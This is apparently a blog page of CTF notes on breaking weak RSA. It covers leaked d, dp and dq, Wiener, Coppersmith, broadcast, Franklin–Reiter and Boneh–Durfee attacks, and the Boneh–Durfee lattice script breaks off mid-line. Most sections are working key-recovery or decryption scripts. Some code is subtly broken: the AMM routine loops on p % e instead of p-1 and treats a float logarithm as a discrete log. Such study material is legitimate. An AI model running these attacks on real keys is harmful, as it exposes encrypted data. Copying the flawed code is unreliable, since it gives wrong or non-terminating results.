<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GF</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    p = a</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">g</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(a,b,p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM</span>(<span class="params">x,e,p</span>):</span><br><span class="line">    GF(p)</span><br><span class="line">    y = random.randint(<span class="number">1</span>, p-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> g(y, (p-<span class="number">1</span>)//e) == <span class="number">1</span>:</span><br><span class="line">        y = random.randint(<span class="number">1</span>, p-<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(y)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;find&quot;</span>)</span><br><span class="line">    <span class="comment">#p-1 = e^t*s</span></span><br><span class="line">    t = <span class="number">1</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> p % e == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(t)</span><br><span class="line">    s = p // (e**t)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;e&#x27;</span>, e)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;p&#x27;</span>, p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;s&#x27;</span>, s)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;t&#x27;</span>, t)</span><br><span class="line">    <span class="comment"># s|ralpha-1</span></span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>((s * k + <span class="number">1</span>) % e != <span class="number">0</span>):</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    alpha = (s * k + <span class="number">1</span>) // e</span><br><span class="line">    a = g(y, (e ** (t - <span class="number">1</span>) ) * s)</span><br><span class="line">    b = g(x, e * alpha - <span class="number">1</span>)</span><br><span class="line">    c = g(y, s)</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t-<span class="number">1</span>):</span><br><span class="line">        d = g(b,e**(t-<span class="number">1</span>-i))</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = -math.log(d,a)</span><br><span class="line">        b = b * (g(g(c, e), j))</span><br><span class="line">        h = h * g(c, j)</span><br><span class="line">        c = g(c, e)</span><br><span class="line">    root = (g(x, alpha * h)) % p</span><br><span class="line">    roots = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(e):</span><br><span class="line">        mp2 = root * g(a,i) % p</span><br><span class="line">        roots.add(mp2)</span><br><span class="line">    <span class="keyword">return</span> roots</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> m: <span class="comment"># edit</span></span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>



<h1 id="RSA-LEAKAGE"><a href="#RSA-LEAKAGE" class="headerlink" title="RSA_LEAKAGE"></a>RSA_LEAKAGE</h1><h2 id="Leakage-d"><a href="#Leakage-d" class="headerlink" title="Leakage_d"></a>Leakage_d</h2><p><strong>Use RSAConverter</strong>.</p>
<ul>
<li>$n$, $d$, hex(), delete <code>0x</code></li>
<li>$e$, hex(), delete <code>x</code></li>
</ul>
<h2 id="Leakage-dp-amp-dq"><a href="#Leakage-dp-amp-dq" class="headerlink" title="Leakage_dp&amp;dq"></a>Leakage_dp&amp;dq</h2><p><strong>Dedection and keypoint</strong>!</p>
<p>Prepare and make a definition to $d_p$ and $d_q$.<br>$$<br>d_p \equiv d \mod p-1<br>$$</p>
<p>$$<br>d_q \equiv d \mod q-1<br>$$</p>
<p>After deductions, we can get four significant equations or relations.<br>$$<br>q \times InvQ \equiv 1 \mod p<br>$$</p>
<p>$$<br>m_p \equiv c^{d_p} \mod p<br>$$</p>
<p>$$<br>m_q \equiv c^{d_q} \mod q<br>$$</p>
<p>$$<br>m \equiv  (((m_p - m_q)\times InvQ)\mod p)\times q + m_q<br>$$</p>
<p>And make the equations convert to codes. Here is the main function: </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_Leakage_dp_dq</span>(<span class="params">dp, dq, p, q, c</span>):</span><br><span class="line">    InvQ = gmpy2.invert(q, p)</span><br><span class="line">    mp = gmpy2.powmod(c, dp, p)</span><br><span class="line">    mq = gmpy2.powmod(c, dq, q)</span><br><span class="line">    m = (((mp-mq)*InvQ)%p)*q + mq</span><br><span class="line">    <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>



<h2 id="Leakage-dp"><a href="#Leakage-dp" class="headerlink" title="Leakage_dp"></a>Leakage_dp</h2><h3 id="basic"><a href="#basic" class="headerlink" title="basic"></a>basic</h3><p><strong>Known</strong>:<br>$$<br>d_p \equiv d \mod (p-1)<br>$$</p>
<p>$$<br>d\times e \equiv 1\mod N \equiv 1 \mod (p-1)(q-1) \tag{1}<br>$$</p>
<p>Make full use of the two known equations and deduce the key condition to obtain the final $p$ and $q$.<br>$$<br>d_p \times e \equiv d \times e \mod (p-1) \equiv de + k_1(p-1) \tag{2}<br>$$<br>Substitute  <code>(2)</code> to <code>(1)</code>:<br>$$<br>k_1(p-1) + d_p e &#x3D; 1 + k_2(p-1)(q-1)<br>$$</p>
<p>$$<br>d_pe - 1 &#x3D; (p-1)[k_2(q-1) -k_1]<br>$$</p>
<p>Assume $k_2(q-1) - k_1$ is $x$, and $x$ is range from 0 and $e$, and we can figure out the $p$ from the equation:<br>$$<br>p &#x3D; \frac{d_{p} e-1}{x} + 1<br>$$<br>If we brute the $p$ in range(0, e) and $q &#x3D; n \div p$ is prime or Integer, we will get the true $p$ and $q$. The code is as follows: </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_Leakage_dp</span>(<span class="params">n,e,dp,c</span>):</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e):  <span class="comment"># start with 1</span></span><br><span class="line">        p = (dp*e - <span class="number">1</span>)//i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> n%p == <span class="number">0</span>:</span><br><span class="line">            q = n//p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        N = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">        d = gmpy2.invert(e, N)</span><br><span class="line">        m = gmpy2.powmod(c, d, n)</span><br><span class="line">        <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>

<h3 id="dp-extension-1-n-x3D-p-b-cdot-q"><a href="#dp-extension-1-n-x3D-p-b-cdot-q" class="headerlink" title="dp_extension-1 $n &#x3D; p^{b} \cdot q$"></a>dp_extension-1 $n &#x3D; p^{b} \cdot q$</h3><blockquote>
<p>reference: Larrozo</p>
<p>relate: [2020YCB]Power</p>
</blockquote>
<img src="/2022/11/04/22-11-04-RSA/hense_lifting.png" class="" title="hense lifting">

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dp_hensel</span>(<span class="params">c, e, dp, p, b</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param b: p^b*q</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    mp_ = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line">    mp = <span class="built_in">pow</span>(c, dp - <span class="number">1</span>, p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, b - <span class="number">2</span>):</span><br><span class="line">        x = <span class="built_in">pow</span>(c - <span class="built_in">pow</span>(mp_, e), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">        y = <span class="built_in">pow</span>(x * mp * invert(e, p), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">        mp_ = mp_ + y</span><br><span class="line">    <span class="keyword">return</span> mp_</span><br></pre></td></tr></table></figure>



<h3 id="dp-extension-2-coppersmith-known-dp-high"><a href="#dp-extension-2-coppersmith-known-dp-high" class="headerlink" title="dp_extension-2 coppersmith known dp high"></a>dp_extension-2 coppersmith known dp high</h3><p>Given: $n, e, dp_0,c,k$</p>
<p><em>the $dp_0$ is the high-digits$(nbits - k)$ of dp, meaning that $dp_0 &#x3D; dp &gt;&gt; k$</em></p>
<p>Solve: use the coppersmith-high p</p>
<h3 id="dp-extension-3-p-x3D-gcd-m-e-cdot-dp-m-n"><a href="#dp-extension-3-p-x3D-gcd-m-e-cdot-dp-m-n" class="headerlink" title="dp_extension-3 $p &#x3D; gcd(m^{e\cdot dp} - m, n)$"></a>dp_extension-3 $p &#x3D; gcd(m^{e\cdot dp} - m, n)$</h3><img src="/2022/11/04/22-11-04-RSA/gcd.png" class="" title="extension">

<h1 id="LARGE-e"><a href="#LARGE-e" class="headerlink" title="LARGE $e$"></a>LARGE $e$</h1><h2 id="Wiener-Attack"><a href="#Wiener-Attack" class="headerlink" title="Wiener Attack"></a>Wiener Attack</h2><blockquote>
<p>$d &lt; N^{0.25}$</p>
</blockquote>
<h3 id="original-deduction"><a href="#original-deduction" class="headerlink" title="original deduction"></a>original deduction</h3><p>From the RSA proof, we have a DEFAULT RULE:<br>$$<br>e\times d \equiv 1 \mod \varphi(n)<br>$$<br>If satisfied conditions, we will get the deduced equation:<br>$$<br>e \times d &#x3D; k \times \varphi(n) + 1 \approx k \times \varphi(n)<br>$$<br>In cryptography, the $n$ is usually very large. So, we can make a connection with $\varphi(n)$:<br>$$<br>\varphi(n) \approx n<br>$$<br>Thus, we can get the final deduction:<br>$$<br>e\times d \approx k \times n<br>$$</p>
<p>$$<br>\frac{e}{n} \approx \frac{k}{d}<br>$$</p>
<h3 id="continued-fraction"><a href="#continued-fraction" class="headerlink" title="continued fraction"></a>continued fraction</h3><p>Use <strong>Extended Euclidean Algorithm</strong>, and we will get the equation. Here is the proof-picture: </p>
<img src="/2022/11/04/22-11-04-RSA/1.jpg" class="" title="continued_fraction">

<p>For the example, we can get the continued fraction that <code>34/99 -&gt; [0, 2, 1, 10, 3]</code>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">continued_fra</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    continued fraction expansion</span></span><br><span class="line"><span class="string">    :param x: 分子</span></span><br><span class="line"><span class="string">    :param y: 分母</span></span><br><span class="line"><span class="string">    :return: 连分数展开列表cf[]</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    cf = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        cf.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="comment"># print(cf)</span></span><br><span class="line">    <span class="keyword">return</span> cf</span><br></pre></td></tr></table></figure>

<h3 id="gradual-fraction"><a href="#gradual-fraction" class="headerlink" title="gradual fraction"></a>gradual fraction</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gradual_fra</span>(<span class="params">cf</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param cf: 连分数展开</span></span><br><span class="line"><span class="string">    :return: 最后的收敛子,收敛子列表 gf[]</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    c = []</span><br><span class="line">    d = []</span><br><span class="line">    c.append(<span class="number">1</span>) <span class="comment"># c[0] = 1</span></span><br><span class="line">    c.append(cf[<span class="number">0</span>]) <span class="comment"># c[1] = cf[0]</span></span><br><span class="line">    d.append(<span class="number">0</span>) <span class="comment"># d[0] = 0</span></span><br><span class="line">    d.append(<span class="number">1</span>) <span class="comment"># d[1]</span></span><br><span class="line">    gf = []</span><br><span class="line">    gf.append(cf[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">len</span>(cf)+<span class="number">1</span>):</span><br><span class="line">        c.append(cf[i-<span class="number">1</span>]*c[i-<span class="number">1</span>] + c[i-<span class="number">2</span>])</span><br><span class="line">        d.append(cf[i-<span class="number">1</span>]*d[i-<span class="number">1</span>] + d[i-<span class="number">2</span>])</span><br><span class="line">        gf.append((c[i], d[i]))</span><br><span class="line">    <span class="comment"># print(gf)</span></span><br><span class="line">    <span class="keyword">return</span> c[<span class="built_in">len</span>(cf)], d[<span class="built_in">len</span>(cf)], gf</span><br></pre></td></tr></table></figure>

<h3 id="Veda’s-theorem"><a href="#Veda’s-theorem" class="headerlink" title="Veda’s theorem"></a>Veda’s theorem</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pq</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    韦达定理，求解方程：x^2+(p+q)x+pq = 0</span></span><br><span class="line"><span class="string">    :param a: x^2系数</span></span><br><span class="line"><span class="string">    :param b: x系数</span></span><br><span class="line"><span class="string">    :param c: pq</span></span><br><span class="line"><span class="string">    :return: p,q</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># par = gmpy2.isqrt(b * b - 4 * a * c)</span></span><br><span class="line">    par = gmpy2.iroot(b * b - <span class="number">4</span> * a * c, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> (-b + par) // (<span class="number">2</span> * a), (-b - par) // (<span class="number">2</span> * a)</span><br></pre></td></tr></table></figure>

<h3 id="main-Wiener"><a href="#main-Wiener" class="headerlink" title="main Wiener"></a>main Wiener</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_Wiener_Attack</span>(<span class="params">e,n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    具体实现</span></span><br><span class="line"><span class="string">    :param e:</span></span><br><span class="line"><span class="string">    :param n:</span></span><br><span class="line"><span class="string">    :return: d</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    cf = continued_fra(e, n)</span><br><span class="line">    gf = gradual_fra(cf)[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">for</span> k, d <span class="keyword">in</span> gf[<span class="number">1</span>:]:</span><br><span class="line">        <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        N = (e * d - <span class="number">1</span>) // k</span><br><span class="line">        p, q = solve_pq(<span class="number">1</span>, n - N + <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> p * q == n:</span><br><span class="line">            <span class="keyword">return</span> d</span><br></pre></td></tr></table></figure>



<h2 id="Boneh-Durfee-Attack"><a href="#Boneh-Durfee-Attack" class="headerlink" title="Boneh-Durfee Attack"></a>Boneh-Durfee Attack</h2><blockquote>
<p>$d&lt; N^{0.29}$</p>
</blockquote>
<h1 id="COPPPERSMITH"><a href="#COPPPERSMITH" class="headerlink" title="COPPPERSMITH"></a>COPPPERSMITH</h1><h2 id="high-m"><a href="#high-m" class="headerlink" title="high m"></a>high m</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># high m</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phase2</span>(<span class="params">high_m, n, c</span>):</span><br><span class="line">    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation = <span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    m = high_m + x</span><br><span class="line">    M = m((m^<span class="number">3</span> - c).small_roots()[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(<span class="built_in">int</span>(M))[<span class="number">2</span>:]</span><br></pre></td></tr></table></figure>



<h2 id="high-p"><a href="#high-p" class="headerlink" title="high p"></a>high p</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># high p</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phase3</span>(<span class="params">high_p, n ,c</span>):</span><br><span class="line">    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation = <span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    p = high_p + x</span><br><span class="line">    x0 = p.small_roots(X = <span class="number">2</span>^<span class="number">128</span>, beta = <span class="number">0.1</span>)[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    P = <span class="built_in">int</span>(p(x0))</span><br><span class="line">    Q = n // P</span><br><span class="line">    <span class="keyword">assert</span> P*Q == n</span><br><span class="line">    d = inverse_mod(e, (P-<span class="number">1</span>)*(Q-<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(power_mod(c, d, n))[<span class="number">2</span>:]</span><br></pre></td></tr></table></figure>



<h2 id="low-d"><a href="#low-d" class="headerlink" title="low d"></a>low d</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># low d</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFullP</span>(<span class="params">low_p, n</span>):</span><br><span class="line">    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    p = x*<span class="number">2</span>^<span class="number">512</span> + low_p</span><br><span class="line">    root = (p-n).monic().small_roots(X = <span class="number">2</span>^<span class="number">128</span>, beta = <span class="number">0.4</span>)</span><br><span class="line">    <span class="keyword">if</span> root:</span><br><span class="line">        <span class="keyword">return</span> p(root[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phase4</span>(<span class="params">low_d, n, c</span>):</span><br><span class="line">    maybe_p = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">        p = var(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">        p0 = solve_mod([<span class="number">3</span>*p*low_d  == p + k*(n*p - p^<span class="number">2</span> - n + p)], <span class="number">2</span>^<span class="number">512</span>)</span><br><span class="line">        maybe_p += [<span class="built_in">int</span>(x[<span class="number">0</span>]) <span class="keyword">for</span> x <span class="keyword">in</span> p0]</span><br><span class="line">    <span class="comment"># print(maybe_p)</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> maybe_p:</span><br><span class="line">        P = getFullP(x, n)</span><br><span class="line">        <span class="keyword">if</span> P: <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    P = <span class="built_in">int</span>(P)</span><br><span class="line">    Q = n // P</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">assert</span> P*Q == n</span><br><span class="line">    </span><br><span class="line">    d = inverse_mod(<span class="number">3</span>, (P-<span class="number">1</span>)*(Q-<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(power_mod(c, d, n))[<span class="number">2</span>:]</span><br></pre></td></tr></table></figure>



<h2 id="crt-x2F-broadcast"><a href="#crt-x2F-broadcast" class="headerlink" title="crt&#x2F;broadcast"></a>crt&#x2F;broadcast</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># crt/broadcast</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phase5</span>(<span class="params">n1, c1, n2, c2, n3, c3</span>):</span><br><span class="line">    r = CRT([c1, c2, c3], [n1, n2, n3])</span><br><span class="line">    m = <span class="built_in">int</span>(r)^(<span class="number">1</span>/<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(m)[<span class="number">2</span>:]</span><br></pre></td></tr></table></figure>



<h2 id="Franklin–Reiter-related-message-attack"><a href="#Franklin–Reiter-related-message-attack" class="headerlink" title="Franklin–Reiter related-message attack"></a>Franklin–Reiter related-message attack</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n  =</span><br><span class="line">c1 = </span><br><span class="line">c2 = </span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">g1 = x^e - c1</span><br><span class="line">g2 = (x+<span class="number">1</span>)^e - c2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MyGcd</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">if</span> y == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> x.monic()</span><br><span class="line">    <span class="keyword">return</span> MyGcd(y, x%y)</span><br><span class="line"></span><br><span class="line">v = MyGcd(g2, g1)</span><br><span class="line">M = n - v.coefficients()[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">assert</span> g1(M) == <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(M)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure>



<h2 id="Boneh-Burfee-Attack"><a href="#Boneh-Burfee-Attack" class="headerlink" title="Boneh Burfee Attack"></a>Boneh Burfee Attack</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Boneh Burfee Attack</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting debug to true will display more informations</span></span><br><span class="line"><span class="string">about the lattice, the bounds, the vectors...</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting strict to true will stop the algorithm (and</span></span><br><span class="line"><span class="string">return (-1, -1)) if we don&#x27;t have a correct </span></span><br><span class="line"><span class="string">upperbound on the determinant. Note that this </span></span><br><span class="line"><span class="string">doesn&#x27;t necesseraly mean that no solutions </span></span><br><span class="line"><span class="string">will be found since the theoretical upperbound is</span></span><br><span class="line"><span class="string">usualy far away from actual results. That is why</span></span><br><span class="line"><span class="string">you should probably use `strict = False`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">This is experimental, but has provided remarkable results</span></span><br><span class="line"><span class="string">so far. It tries to reduce the lattice as much as it can</span></span><br><span class="line"><span class="string">while keeping its efficiency. I see no reason not to use</span></span><br><span class="line"><span class="string">this option, but if things don&#x27;t work, you should try</span></span><br><span class="line"><span class="string">disabling it</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># stop removing if lattice reaches that dimension</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Functions</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display stats on helpful vectors</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">helpful_vectors</span>(<span class="params">BB, modulus</span>):</span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (nothelpful, <span class="string">&quot;/&quot;</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">&quot; vectors are not helpful&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># display matrix picture with 0 and X</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_overview</span>(<span class="params">BB, bound</span>):</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%02d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:</span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">&#x27;~&#x27;</span></span><br><span class="line">        <span class="built_in">print</span> (a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tries to remove unhelpful vectors</span></span><br><span class="line"><span class="comment"># we start at current = n-1 (last vector)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):</span><br><span class="line">    <span class="comment"># end of our recursive function</span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we start by checking from the end</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># if it is unhelpful:</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">            <span class="comment"># let&#x27;s check if it affects other vectors</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># if another vector is affected:</span></span><br><span class="line">                <span class="comment"># we increase the count</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:0</span></span><br><span class="line">            <span class="comment"># if no other vectors end up affected</span></span><br><span class="line">            <span class="comment"># we remove it</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;* removing unhelpful vector&quot;</span>, ii)</span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:1</span></span><br><span class="line">            <span class="comment"># if just one was affected we check</span></span><br><span class="line">            <span class="comment"># if it is affecting someone else</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># if it is affecting even one vector</span></span><br><span class="line">                    <span class="comment"># we give up on this one</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># remove both it if no other vector was affected and</span></span><br><span class="line">                <span class="comment"># this helpful vector is not helpful enough</span></span><br><span class="line">                <span class="comment"># compared to our unhelpful one</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> <span class="built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="built_in">abs</span>(bound - BB[ii, ii]):</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;* removing unhelpful vectors&quot;</span>, ii, <span class="string">&quot;and&quot;</span>, affected_vector_index)</span><br><span class="line">                    BB 